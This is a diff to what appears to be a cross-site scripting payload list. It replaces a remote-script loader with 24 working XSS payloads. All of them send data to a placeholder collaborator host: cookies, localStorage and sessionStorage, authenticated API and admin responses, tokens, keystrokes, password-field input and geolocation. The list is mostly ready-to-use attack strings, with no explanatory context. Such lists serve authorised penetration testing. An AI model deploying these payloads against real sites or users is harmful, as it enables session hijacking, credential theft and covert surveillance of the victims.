@@ -1,1 +1,25 @@
-"><script src=https://CALLBACK/payload.js></script>
+<script>fetch('http://COLLABORATOR_URL/?c='+btoa(document.cookie))</script>
+<script>new Image().src='http://COLLABORATOR_URL/?c='+encodeURIComponent(document.cookie)</script>
+<script>navigator.sendBeacon('http://COLLABORATOR_URL/',document.cookie)</script>
+<script>fetch('http://COLLABORATOR_URL/',{method:'POST',body:JSON.stringify({c:document.cookie,u:location.href})})</script>
+<script>var x=new XMLHttpRequest();x.open('POST','http://COLLABORATOR_URL/');x.send(document.cookie);</script>
+<script>document.write('<img src="http://COLLABORATOR_URL/?c='+document.cookie+'">')</script>
+<script>var l=document.createElement('link');l.rel='preload';l.href='http://COLLABORATOR_URL/?c='+document.cookie;document.head.appendChild(l)</script>
+<script>fetch('http://COLLABORATOR_URL/?ls='+btoa(JSON.stringify(localStorage)))</script>
+<script>var data={c:document.cookie,ls:{},ss:{}};for(var k in localStorage){data.ls[k]=localStorage[k]};for(var k in sessionStorage){data.ss[k]=sessionStorage[k]};fetch('http://COLLABORATOR_URL/',{method:'POST',body:JSON.stringify(data)})</script>
+<script>fetch('/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://COLLABORATOR_URL/api?d='+btoa(d)))</script>
+<script>fetch('/admin',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://COLLABORATOR_URL/admin?d='+btoa(d)))</script>
+<script>fetch('/api/token').then(r=>r.json()).then(d=>fetch('http://COLLABORATOR_URL/?token='+btoa(JSON.stringify(d))))</script>
+<script>document.addEventListener('keypress',function(e){fetch('http://COLLABORATOR_URL/?k='+e.key)})</script>
+<script>document.querySelectorAll('input[type=password]').forEach(e=>e.addEventListener('input',function(){fetch('http://COLLABORATOR_URL/?p='+this.value)}))</script>
+<script>setInterval(()=>fetch('http://COLLABORATOR_URL/?c='+document.cookie),5000)</script>
+<script>window.onerror=function(m,u,l){fetch('http://COLLABORATOR_URL/?err='+btoa(m+u+l))}</script>
+<script>fetch('http://COLLABORATOR_URL/?ref='+encodeURIComponent(document.referrer))</script>
+<script>fetch('http://COLLABORATOR_URL/?title='+encodeURIComponent(document.title))</script>
+<script>fetch('http://COLLABORATOR_URL/?ua='+encodeURIComponent(navigator.userAgent))</script>
+<script>navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>fetch('http://COLLABORATOR_URL/?lat='+p.coords.latitude+'&lng='+p.coords.longitude))</script>
+<img src=x onerror="fetch('http://COLLABORATOR_URL/?c='+btoa(document.cookie))">
+<svg onload="fetch('http://COLLABORATOR_URL/?c='+btoa(document.cookie))">
+<body onload="new Image().src='http://COLLABORATOR_URL/?c='+document.cookie">
+<input autofocus onfocus="new Image().src='http://COLLABORATOR_URL/?c='+document.cookie">
+<details open ontoggle="new Image().src='http://COLLABORATOR_URL/?c='+document.cookie">
